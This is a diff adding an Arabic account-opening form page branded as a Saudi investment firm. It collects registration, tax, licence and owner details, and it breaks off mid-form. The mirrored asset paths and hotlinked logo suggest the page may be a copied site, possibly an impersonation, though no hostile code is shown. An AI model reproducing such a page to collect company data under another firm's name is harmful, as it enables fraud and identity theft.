@@ -1,0 +1,1165 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>فتح حساب كيانات | مشاركة المالية</title>
+  <link rel="icon" href="../wp-content/uploads/2025/03/faviconV2.png" sizes="32x32">
+  <link rel="stylesheet" href="../wp-content/litespeed/css/a0062117fd9d72362afee7da555070cd.css">
+
+  <style>
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-light.woff2') format('woff2');
+      font-weight: 300; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-regular.woff2') format('woff2');
+      font-weight: 400; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-medium.woff2') format('woff2');
+      font-weight: 500; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-bold.woff2') format('woff2');
+      font-weight: 700; font-display: swap;
+    }
+    @font-face {
+      font-family: 'Tajawal';
+      src: url('../wp-content/themes/musharka-theme/assets/fonts/arabic-fonts/tajawal-extrabold.woff2') format('woff2');
+      font-weight: 800; font-display: swap;
+    }
+  </style>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --gold:       #b5985a;
+      --gold-light: #eed3a6;
+      --gold-dark:  #8c7340;
+      --dark:       #1a1a1a;
+      --dark-2:     #231f20;
+      --bg:         #f5f0e8;
+      --white:      #ffffff;
+      --muted:      #6c6c6c;
+      --border:     #ddd0b8;
+      --error:      #c0392b;
+      --success:    #1e8449;
+      --blue:       #2980b9;
+    }
+
+    html, body { height: 100%; font-family: 'Tajawal', sans-serif; background: var(--dark-2); color: var(--dark); direction: rtl; }
+
+    /* ── LAYOUT ── */
+    .page-wrapper { display: flex; min-height: 100vh; }
+
+    /* ASIDE */
+    .aside {
+      flex: 0 0 42%; position: sticky; top: 0; height: 100vh;
+      background: var(--dark-2) center/cover no-repeat;
+      display: flex; flex-direction: column; align-items: center;
+      justify-content: space-between; padding: 40px 30px; overflow: hidden;
+    }
+    .aside::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(160deg, rgba(26,26,26,.9) 0%, rgba(26,26,26,.65) 50%, rgba(181,152,90,.25) 100%);
+    }
+    .aside > * { position: relative; z-index: 1; }
+    .aside-logo img { max-height: 80px; filter: brightness(1.1); }
+    .aside-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 6px 16px; border-radius: 100px;
+      background: rgba(181,152,90,.2); border: 1px solid rgba(181,152,90,.4);
+      color: var(--gold-light); font-size: .82rem; font-weight: 600;
+      margin-bottom: 14px;
+    }
+    .aside-text { text-align: center; color: var(--white); }
+    .aside-text h2 { font-size: 2rem; font-weight: 800; color: var(--gold-light); line-height: 1.4; margin-bottom: 14px; }
+    .aside-text p  { font-size: 1rem; font-weight: 300; color: rgba(255,255,255,.75); line-height: 1.8; max-width: 320px; margin: 0 auto; }
+    .aside-features { display: flex; flex-direction: column; gap: 10px; width: 100%; }
+    .aside-feature  { display: flex; align-items: center; gap: 10px; color: rgba(255,255,255,.8); font-size: .88rem; }
+    .aside-feature-icon {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: rgba(181,152,90,.2); display: flex; align-items: center;
+      justify-content: center; font-size: 1rem; flex-shrink: 0;
+    }
+    .aside-footer { text-align: center; color: rgba(255,255,255,.4); font-size: .78rem; }
+    .aside-footer p + p { margin-top: 6px; }
+
+    .aside-contact { display: flex; justify-content: center; gap: 12px; margin-bottom: 16px; }
+    .aside-contact a {
+      display: flex; align-items: center; gap: 6px;
+      background: rgba(255,255,255,0.12); color: #fff; text-decoration: none;
+      padding: 8px 16px; border-radius: 8px; font-size: .88rem; font-weight: 500;
+      transition: background .2s;
+    }
+    .aside-contact a:hover { background: rgba(255,255,255,0.22); }
+    .aside-contact a.wa { background: rgba(37,211,102,0.25); }
+    .aside-contact a.wa:hover { background: rgba(37,211,102,0.4); }
+
+    .float-contact { display: none; position: fixed; bottom: 20px; left: 20px; z-index: 999; flex-direction: column; gap: 10px; }
+    .float-contact a {
+      width: 48px; height: 48px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-size: 1.3rem; text-decoration: none;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.25);
+    }
+    .float-contact a.wa  { background: #25d366; }
+    .float-contact a.tel { background: var(--gold); }
+    @media (max-width: 768px) { .float-contact { display: flex; } }
+
+    /* FORM SIDE */
+    .form-side { flex: 1; background: var(--bg); overflow-y: auto; display: flex; flex-direction: column; }
+    .form-container { max-width: 720px; width: 100%; margin: 0 auto; padding: 50px 40px 70px; }
+
+    /* HEADER */
+    .form-header { margin-bottom: 32px; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: 6px;
+      color: var(--gold); text-decoration: none; font-size: .9rem;
+      font-weight: 500; margin-bottom: 20px; transition: opacity .2s;
+    }
+    .back-link:hover { opacity: .75; }
+    .form-header h1 { font-size: 1.8rem; font-weight: 800; color: var(--dark); line-height: 1.3; }
+    .form-header p  { margin-top: 8px; color: var(--muted); font-size: .95rem; }
+
+    /* PROGRESS */
+    .progress-steps { display: flex; gap: 6px; margin-bottom: 36px; }
+    .step-bar { height: 4px; flex: 1; border-radius: 100px; background: var(--border); }
+    .step-bar.active { background: var(--gold); }
+
+    /* SECTION */
+    .section-title {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 18px; margin-top: 34px;
+    }
+    .section-title:first-of-type { margin-top: 0; }
+    .section-number {
+      width: 32px; height: 32px; border-radius: 50%; background: var(--gold);
+      color: var(--white); font-size: .85rem; font-weight: 700;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .section-title h2 { font-size: 1.05rem; font-weight: 700; color: var(--dark); flex: 1; }
+    .section-line  { flex: 1; height: 1px; background: var(--border); }
+
+    /* GRID */
+    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .form-grid .full { grid-column: 1 / -1; }
+    .form-group { display: flex; flex-direction: column; gap: 6px; }
+
+    label { font-size: .85rem; font-weight: 600; color: var(--dark); }
+    label .req { color: var(--gold); margin-right: 2px; }
+    label .opt { font-weight: 400; color: var(--muted); font-size: .78rem; }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="tel"],
+    input[type="email"],
+    input[type="date"],
+    input[type="url"],
+    select,
+    textarea {
+      width: 100%; padding: 12px 14px;
+      border: 1.5px solid var(--border); border-radius: 10px;
+      background: var(--white); font-family: 'Tajawal', sans-serif;
+      font-size: .95rem; color: var(--dark); outline: none;
+      transition: border-color .2s, box-shadow .2s; direction: rtl;
+    }
+    input:focus, select:focus, textarea:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    input.error, select.error, textarea.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(192,57,43,.10);
+    }
+    .err { font-size: .78rem; color: var(--error); display: none; }
+    input.error ~ .err, select.error ~ .err, textarea.error ~ .err { display: block; }
+
+    select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23b5985a' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat; background-position: left 14px center; padding-left: 40px;
+    }
+    textarea { resize: vertical; min-height: 100px; }
+
+    /* FILE UPLOAD */
+    .file-upload {
+      display: flex; flex-direction: column; gap: 0;
+    }
+    .file-box {
+      display: flex; align-items: center; gap: 0;
+      border: 1.5px solid var(--border); border-radius: 10px;
+      overflow: hidden; background: var(--white);
+      transition: border-color .2s, box-shadow .2s;
+    }
+    .file-box:focus-within {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    .file-box.error { border-color: var(--error); }
+    .file-trigger {
+      padding: 11px 16px; background: var(--gold); color: var(--white);
+      font-family: 'Tajawal', sans-serif; font-size: .85rem; font-weight: 600;
+      cursor: pointer; white-space: nowrap; flex-shrink: 0;
+      transition: background .2s; border: none; outline: none;
+    }
+    .file-trigger:hover { background: var(--gold-dark); }
+    .file-name {
+      flex: 1; padding: 0 12px; font-size: .88rem; color: var(--muted);
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    input[type="file"] { display: none; }
+    .file-hint { font-size: .75rem; color: var(--muted); margin-top: 4px; }
+
+    /* OWNER CARD */
+    .owner-card {
+      border: 1.5px solid var(--border); border-radius: 14px;
+      background: var(--white); overflow: hidden;
+    }
+    .owner-card-header {
+      padding: 14px 18px; background: rgba(181,152,90,.06);
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; gap: 10px;
+    }
+    .owner-card-header span { font-weight: 700; font-size: .95rem; color: var(--dark); }
+    .owner-icon {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: rgba(181,152,90,.15); display: flex; align-items: center;
+      justify-content: center; font-size: 1rem; flex-shrink: 0;
+    }
+    .owner-card-body { padding: 18px; }
+    .owner-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .owner-grid .full { grid-column: 1 / -1; }
+
+    /* OFFER CARDS */
+    .offer-cards { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .offer-card { position: relative; cursor: pointer; }
+    .offer-card input[type="radio"] { position: absolute; opacity: 0; width: 0; height: 0; }
+    .offer-card-label {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+      padding: 16px 12px; border: 2px solid var(--border); border-radius: 12px;
+      background: var(--white); cursor: pointer; transition: all .2s; text-align: center; width: 100%;
+    }
+    .offer-card-label:hover { border-color: var(--gold-light); background: rgba(238,211,166,.15); }
+    .offer-card input:checked + .offer-card-label {
+      border-color: var(--gold); background: rgba(181,152,90,.08);
+      box-shadow: 0 0 0 3px rgba(181,152,90,.15);
+    }
+    .oc-icon { font-size: 1.8rem; line-height: 1; }
+    .oc-name { font-size: .85rem; font-weight: 700; color: var(--dark); }
+    .oc-desc { font-size: .75rem; color: var(--muted); line-height: 1.4; }
+
+    /* SUBMIT */
+    .submit-section { margin-top: 36px; display: flex; flex-direction: column; gap: 14px; }
+    .btn-submit {
+      width: 100%; padding: 15px 24px; background: var(--gold); color: var(--white);
+      border: none; border-radius: 12px; font-family: 'Tajawal', sans-serif;
+      font-size: 1.05rem; font-weight: 700; cursor: pointer; transition: all .25s;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .btn-submit:hover { background: var(--gold-dark); transform: translateY(-1px); box-shadow: 0 6px 20px rgba(181,152,90,.35); }
+    .btn-submit:active { transform: translateY(0); }
+    .btn-submit.loading { opacity: .75; pointer-events: none; }
+    .spinner {
+      display: none; width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,.35); border-top-color: #fff;
+      border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0;
+    }
+    .btn-submit.loading .spinner  { display: block; }
+    .btn-submit.loading .btn-icon { display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .terms-note { text-align: center; font-size: .8rem; color: var(--muted); line-height: 1.7; }
+    .terms-note a { color: var(--gold); text-decoration: none; }
+
+    /* SUCCESS */
+    .success-overlay {
+      display: none; position: fixed; inset: 0;
+      background: rgba(26,26,26,.78); z-index: 999;
+      align-items: center; justify-content: center;
+    }
+    .success-overlay.show { display: flex; }
+    .success-card {
+      background: var(--white); border-radius: 20px; padding: 50px 40px;
+      text-align: center; max-width: 440px; width: 90%; animation: popIn .35s ease;
+    }
+    @keyframes popIn { from { transform: scale(.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .success-icon {
+      width: 72px; height: 72px; background: rgba(30,132,73,.1); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
+      color: var(--success);
+    }
+    .success-card h2 { font-size: 1.4rem; font-weight: 800; color: var(--dark); margin-bottom: 10px; }
+    .success-card p  { color: var(--muted); font-size: .95rem; line-height: 1.8; margin-bottom: 28px; }
+    .btn-home {
+      display: inline-block; padding: 12px 32px; background: var(--gold);
+      color: var(--white); border-radius: 10px; text-decoration: none;
+      font-weight: 700; font-size: .95rem; transition: background .2s;
+    }
+    .btn-home:hover { background: var(--gold-dark); }
+
+    /* TOAST */
+    .toast-error {
+      display: none; position: fixed; bottom: 28px; left: 50%;
+      transform: translateX(-50%); background: #c0392b; color: #fff;
+      padding: 12px 24px; border-radius: 10px; font-size: .9rem; font-weight: 600;
+      z-index: 9999; box-shadow: 0 4px 20px rgba(0,0,0,.2);
+      white-space: nowrap; animation: fadeUp .3s ease;
+    }
+    .toast-error.show { display: block; }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateX(-50%) translateY(10px); }
+      to   { opacity: 1; transform: translateX(-50%) translateY(0); }
+    }
+
+    /* NUMBER NO ARROWS */
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; }
+    input[type=number] { -moz-appearance: textfield; }
+
+    ::placeholder { color: #bbb; font-size: .9rem; }
+
+    /* RESPONSIVE */
+    @media (max-width: 900px) {
+      .aside { display: none; }
+      .form-container { padding: 32px 24px 50px; }
+    }
+    @media (max-width: 600px) {
+      .form-grid, .owner-grid { grid-template-columns: 1fr; }
+      .form-grid .full, .owner-grid .full { grid-column: 1; }
+      .offer-cards { grid-template-columns: 1fr 1fr; }
+      .form-header h1 { font-size: 1.5rem; }
+    }
+    @media (max-width: 420px) {
+      .offer-cards { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+
+<body>
+
+<!-- Toast -->
+<div class="toast-error" id="toastError"></div>
+
+<!-- Success -->
+<div class="success-overlay" id="successOverlay">
+  <div class="success-card">
+    <div class="success-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor" viewBox="0 0 16 16">
+        <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+      </svg>
+    </div>
+    <h2>شكراً لكم! 🎉</h2>
+    <p>
+      تم استلام طلب فتح حساب المنشأة بنجاح.<br>
+      <strong>سيتم التواصل معكم من أجل تسجيل حساب الشركة في مشاركة المالية.</strong><br><br>
+      نقدّر ثقتكم وسيتواصل معكم فريقنا المتخصص قريباً.
+    </p>
+    <a href="index.htm" class="btn-home">العودة إلى الرئيسية</a>
+  </div>
+</div>
+
+<!-- PAGE -->
+<div class="page-wrapper">
+
+  <!-- ASIDE -->
+  <aside class="aside">
+    <div class="aside-logo">
+      <a href="index.htm">
+        <img src="https://musharaka.sa/wp-content/uploads/2025/04/ad0dd98ee54f5c1cc0ad82aed29e0605.png"
+             onerror="this.style.display='none'" alt="مشاركة المالية">
+      </a>
+    </div>
+
+    <div class="aside-text">
+      <div class="aside-badge">🏢 حسابات الكيانات</div>
+      <h2>استثمارات المؤسسات والشركات</h2>
+      <p>حلول استثمارية متكاملة مصمّمة خصيصاً للشركات والمؤسسات التجارية في السوق السعودية.</p>
+    </div>
+
+    <div class="aside-features">
+      <div class="aside-feature">
+        <div class="aside-feature-icon">🛡️</div>
+        <span>حماية قانونية كاملة للأصول المؤسسية</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">📊</div>
+        <span>تقارير تفصيلية دورية للمساهمين</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">👥</div>
+        <span>مستشار استثماري مخصص للمنشأة</span>
+      </div>
+      <div class="aside-feature">
+        <div class="aside-feature-icon">⚡</div>
+        <span>معالجة سريعة لطلبات المؤسسات</span>
+      </div>
+    </div>
+
+    <div class="aside-contact">
+      <a href="https://wa.me/966582062882" class="wa" target="_blank" title="واتساب">
+        <i class="fa-brands fa-whatsapp" aria-hidden="true"></i> واتساب
+      </a>
+      <a href="tel:+966582062882" class="tel" title="اتصال هاتفي">
+        <i class="fa-solid fa-phone-volume" aria-hidden="true"></i> اتصال
+      </a>
+    </div>
+    <div class="aside-footer">
+      <p>مرخّصة من هيئة السوق المالية · ترخيص رقم 27-13169</p>
+      <p>© 2025 مشاركة المالية. جميع الحقوق محفوظة.</p>
+    </div>
+  </aside>
+
+  <!-- floating contact buttons (mobile) -->
+  <div class="float-contact">
+    <a href="https://wa.me/966582062882" class="wa" target="_blank" title="واتساب">
+      <i class="fa-brands fa-whatsapp" aria-hidden="true"></i>
+      <span class="sr-only">واتساب</span>
+    </a>
+    <a href="tel:+966582062882" class="tel" title="اتصال&nbsp;هاتفي">
+      <i class="fa-solid fa-phone-volume" aria-hidden="true"></i>
+      <span class="sr-only">اتصال&nbsp;هاتفي</span>
+    </a>
+  </div>
+
+  <!-- FORM SIDE -->
+  <main class="form-side">
+    <div class="form-container">
+
+      <div class="form-header">
+        <a href="index.htm" class="back-link">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd" d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0z"/>
+          </svg>
+          العودة للرئيسية
+        </a>
+        <h1>فتح حساب كيانات تجارية</h1>
+        <p>أكمل بيانات المنشأة التالية وسيتواصل معكم فريقنا المتخصص في أقرب وقت</p>
+      </div>
+
+      <div class="progress-steps">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+      </div>
+
+      <form id="entityForm" novalidate>
+
+        <!-- ══════════════════════════════════════
+             القسم ١: بيانات الشركة / المنشأة
+        ══════════════════════════════════════ -->
+        <div class="section-title">
+          <div class="section-number">١</div>
+          <h2>بيانات الشركة / المنشأة</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group full">
+            <label for="companyName">اسم الشركة / المنشأة <span class="req">*</span></label>
+            <input type="text" id="companyName" name="companyName"
+                   placeholder="أدخل الاسم الرسمي كما في السجل التجاري" required>
+            <span class="err">هذا الحقل مطلوب</span>
+          </div>
+
+          <div class="form-group">
+            <label for="entityType">نوع الكيان <span class="req">*</span></label>
+            <select id="entityType" name="entityType" required>
+              <option value="" disabled selected>اختر نوع الكيان</option>
+              <option value="company_limited">شركة ذات مسؤولية محدودة</option>
+              <option value="joint_stock">شركة مساهمة</option>
+              <option value="sole_prop">مؤسسة فردية</option>
+              <option value="partnership">شركة تضامن</option>
+              <option value="holding">شركة قابضة</option>
+              <option value="foreign_branch">فرع شركة أجنبية</option>
+              <option value="ngo">جمعية / منظمة غير ربحية</option>
+              <option value="other">أخرى</option>
+            </select>
+            <span class="err">يرجى اختيار نوع الكيان</span>
+          </div>
+
+          <div class="form-group">
+            <label for="crNumber">رقم السجل التجاري <span class="req">*</span></label>
+            <input type="text" id="crNumber" name="crNumber"
+                   placeholder="10 أرقام" maxlength="10" required>
+            <span class="err">أدخل رقم السجل التجاري الصحيح</span>
+          </div>
+
+          <div class="form-group">
+            <label for="crExpiry">تاريخ انتهاء السجل التجاري <span class="req">*</span></label>
+            <input type="date" id="crExpiry" name="crExpiry" required>
+            <span class="err">أدخل تاريخ انتهاء السجل التجاري</span>
+          </div>
+
+          <div class="form-group">
+            <label for="taxNumber">الرقم الضريبي <span class="req">*</span></label>
+            <input type="text" id="taxNumber" name="taxNumber"
+                   placeholder="15 رقماً" maxlength="15" required>
+            <span class="err">أدخل الرقم الضريبي</span>
+          </div>
+
+          <div class="form-group">
+            <label for="foundYear">سنة التأسيس <span class="req">*</span></label>
+            <input type="number" id="foundYear" name="foundYear"
+                   placeholder="مثال: 2010" min="1900" max="2025" required>
+            <span class="err">أدخل سنة تأسيس صحيحة</span>
+          </div>
+
+          <div class="form-group">
+            <label for="country">بلد التسجيل <span class="req">*</span></label>
+            <select id="country" name="country" required>
+              <option value="" disabled selected>اختر البلد</option>
+              <option value="SA" selected>المملكة العربية السعودية</option>
+              <option value="AE">الإمارات العربية المتحدة</option>
+              <option value="KW">الكويت</option>
+              <option value="QA">قطر</option>
+              <option value="BH">البحرين</option>
+              <option value="OM">سلطنة عُمان</option>
+              <option value="EG">مصر</option>
+              <option value="JO">الأردن</option>
+              <option value="US">الولايات المتحدة الأمريكية</option>
+              <option value="GB">المملكة المتحدة</option>
+              <option value="OTHER">أخرى</option>
+            </select>
+            <span class="err">يرجى اختيار البلد</span>
+          </div>
+
+          <div class="form-group">
+            <label for="city">المدينة <span class="req">*</span></label>
+            <input type="text" id="city" name="city" placeholder="اسم المدينة" required>
+            <span class="err">أدخل المدينة</span>
+          </div>
+
+          <div class="form-group full">
+            <label for="address">العنوان التفصيلي <span class="req">*</span></label>
+            <input type="text" id="address" name="address"
+                   placeholder="الشارع، الحي، المبنى / رقم المكتب" required>
+            <span class="err">أدخل العنوان</span>
+          </div>
+
+        </div>
+
+        <!-- ══════════════════════════════════════
+             القسم ٢: الترخيص التجاري والوثائق
+        ══════════════════════════════════════ -->
+        <div class="section-title">
+          <div class="section-number">٢</div>
+          <h2>الترخيص التجاري والوثائق الرسمية</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group">
+            <label for="licenseNumber">رقم الترخيص التجاري <span class="req">*</span></label>
+            <input type="text" id="licenseNumber" name="licenseNumber"
+                   placeholder="أدخل رقم الترخيص" required>
+            <span class="err">أدخل رقم الترخيص التجاري</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseExpiry">تاريخ انتهاء الترخيص <span class="req">*</span></label>
+            <input type="date" id="licenseExpiry" name="licenseExpiry" required>
+            <span class="err">أدخل تاريخ انتهاء الترخيص</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseAuthority">جهة إصدار الترخيص <span class="req">*</span></label>
+            <select id="licenseAuthority" name="licenseAuthority" required>
+              <option value="" disabled selected>اختر الجهة</option>
+              <option value="mci">وزارة التجارة</option>
+              <option value="momra">وزارة الشؤون البلدية</option>
+              <option value="sama">البنك المركزي السعودي (ساما)</option>
+              <option value="cma">هيئة السوق المالية</option>
+              <option value="moh">وزارة الصحة</option>
+              <option value="moe">وزارة التعليم</option>
+              <option value="other">جهة أخرى</option>
+            </select>
+            <span class="err">اختر جهة الإصدار</span>
+          </div>
+
+          <div class="form-group">
+            <label for="licenseActivity">النشاط التجاري الرئيسي <span class="req">*</span></label>
+            <input type="text" id="licenseActivity" name="licenseActivity"
+                   placeholder="مثال: استثمار مالي، تطوير عقاري" required>
+            <span class="err">أدخل النشاط التجاري</span>
+          </div>
+
+          <!-- صورة السجل التجاري -->
+          <div class="form-group full file-upload">
+            <label>صورة السجل التجاري <span class="req">*</span></label>
+            <div class="file-box" id="crFileBox">
+              <button type="button" class="file-trigger" onclick="document.getElementById('crFile').click()">
+                📎 اختر ملف
+              </button>
+              <span class="file-name" id="crFileName">لم يُختر ملف بعد</span>
+              <input type="file" id="crFile" name="crFile" accept=".pdf,.jpg,.jpeg,.png">
+            </div>
+            <span class="file-hint">PDF أو صورة · الحد الأقصى 5 ميجابايت</span>
+            <span class="err" id="crFileErr">يرجى رفع صورة السجل التجاري</span>
+          </div>
+
+          <!-- صورة الترخيص التجاري -->
+          <div class="form-group full file-upload">
+            <label>صورة الترخيص التجاري <span class="opt">(اختياري)</span></label>
+            <div class="file-box" id="licFileBox">
+              <button type="button" class="file-trigger" onclick="document.getElementById('licFile').click()">
+                📎 اختر ملف
+              </button>
+              <span class="file-name" id="licFileName">لم يُختر ملف بعد</span>
+              <input type="file" id="licFile" name="licFile" accept=".pdf,.jpg,.jpeg,.png">
+            </div>
+            <span class="file-hint">PDF أو صورة · الحد الأقصى 5 ميجابايت</span>
+          </div>
+
+        </div>
+
+        <!-- ══════════════════════════════════════
+             القسم ٣: البيانات التجارية والمالية
+        ══════════════════════════════════════ -->
+        <div class="section-title">
+          <div class="section-number">٣</div>
+          <h2>البيانات التجارية والمالية</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="form-grid">
+
+          <div class="form-group">
+            <label for="companyPhone">هاتف الشركة <span class="req">*</span></label>
+            <input type="tel" id="companyPhone" name="companyPhone"
+                   placeholder="+966XXXXXXXXX" required>
+            <span class="err">أدخل رقم هاتف الشركة</span>
+          </div>
+
+          <div class="form-group">
+            <label for="companyEmail">البريد الإلكتروني الرسمي <span class="req">*</span></label>
+            <input type="email" id="companyEmail" name="companyEmail"
+                   placeholder="info@company.com" required>
+            <span class="err">أدخل بريداً إلكترونياً صحيحاً</span>
+          </div>
+
+          <div class="form-group">
+            <label for="website">الموقع الإلكتروني <span class="opt">(اختياري)</span></label>
+            <input type="url" id="website" name="website" placeholder="https://www.company.com">
+          </div>
+
+          <div class="form-group">
+            <label for="employeeCount">عدد الموظفين <span class="req">*</span></label>
+            <select id="employeeCount" name="employeeCount" required>
+              <option value="" disabled selected>اختر النطاق</option>
+              <option value="1-9">1 – 9 موظفين (صغيرة جداً)</option>
+              <option value="10-49">10 – 49 موظف (صغيرة)</option>
+              <option value="50-249">50 – 249 موظف (متوسطة)</option>
+              <option value="250+">250 موظف أو أكثر (كبيرة)</option>
+            </select>
+            <span class="err">اختر نطاق عدد الموظفين</span>
+          </div>
+
+          <div class="form-group">
+            <label for="annualRevenue">الإيرادات السنوية (تقريباً) <span class="req">*</span></label>
+            <select id="annualRevenue" name="annualRevenue" required>
+              <option value="" disabled selected>اختر النطاق</option>
+              <option value="under1m">أقل من مليون ريال</option>
+              <option value="1m-5m">1 – 5 مليون ريال</option>
+              <option value="5m-20m">5 – 20 مليون ريال</option>
+              <option value="20m-100m">20 – 100 مليون ريال</option>
+              <option value="over100m">أكثر من 100 مليون ريال</option>
+            </select>
+            <span class="err">اختر نطاق الإيرادات</span>
+          </div>
+
+          <div class="form-group">
+            <label for="capitalAmount">رأس المال المُراد استثماره (ريال) <span class="req">*</span></label>
+            <input type="number" id="capitalAmount" name="capitalAmount"
+                   placeholder="أدخل المبلغ" min="50000" required>
+            <span class="err" id="capitalErr">الحد الأدنى للاستثمار المؤسسي 50,000 ريال</span>
+          </div>
+
+          <!-- نوع الخدمة المطلوبة -->
+          <div class="form-group full">
+            <label>نوع الخدمة المطلوبة <span class="req">*</span></label>
+            <div class="offer-cards" id="offerCards">
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="portfolio_mgmt">
+                <span class="offer-card-label">
+                  <span class="oc-icon">💼</span>
+                  <span class="oc-name">إدارة المحافظ</span>
+                  <span class="oc-desc">إدارة محترفة للأصول المؤسسية</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="reits">
+                <span class="offer-card-label">
+                  <span class="oc-icon">🏗️</span>
+                  <span class="oc-name">صناديق الاستثمار العقاري</span>
+                  <span class="oc-desc">استثمار عقاري متنوع</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="investment_banking">
+                <span class="offer-card-label">
+                  <span class="oc-icon">🏦</span>
+                  <span class="oc-name">المصرفية الاستثمارية</span>
+                  <span class="oc-desc">استشارات الاندماج والاستحواذ</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="brokerage">
+                <span class="offer-card-label">
+                  <span class="oc-icon">📊</span>
+                  <span class="oc-name">وساطة الأوراق المالية</span>
+                  <span class="oc-desc">تداول الأسهم والسندات</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="ipo_mgmt">
+                <span class="offer-card-label">
+                  <span class="oc-icon">🎯</span>
+                  <span class="oc-name">إدارة الاكتتابات</span>
+                  <span class="oc-desc">ترتيب وإدارة الطرح العام</span>
+                </span>
+              </label>
+
+              <label class="offer-card">
+                <input type="radio" name="offerType" value="custody">
+                <span class="offer-card-label">
+                  <span class="oc-icon">🔐</span>
+                  <span class="oc-name">خدمات الحفظ</span>
+                  <span class="oc-desc">حفظ وإدارة الأوراق المالية</span>
+                </span>
+              </label>
+
+            </div>
+            <span class="err" id="offerErr">يرجى اختيار نوع الخدمة</span>
+          </div>
+
+        </div>
+
+        <!-- ══════════════════════════════════════
+             القسم ٤: بيانات مالك الشركة / المفوّض
+        ══════════════════════════════════════ -->
+        <div class="section-title">
+          <div class="section-number">٤</div>
+          <h2>بيانات مالك الشركة / الممثل المفوّض</h2>
+          <div class="section-line"></div>
+        </div>
+
+        <div class="owner-card">
+          <div class="owner-card-header">
+            <div class="owner-icon">👤</div>
+            <span>المسؤول الأول عن الحساب</span>
+          </div>
+          <div class="owner-card-body">
+            <div class="owner-grid">
+
+              <div class="form-group">
+                <label for="ownerFirst">الاسم الأول <span class="req">*</span></label>
+                <input type="text" id="ownerFirst" name="ownerFirst" placeholder="الاسم الأول" required>
+                <span class="err">مطلوب</span>
+              </div>
+
+              <div class="form-group">
+                <label for="ownerSecond">الاسم الثاني <span class="req">*</span></label>
+                <input type="text" id="ownerSecond" name="ownerSecond" placeholder="الاسم الثاني" required>
+                <span class="err">مطلوب</span>
+              </div>
+
+              <div class="form-group">
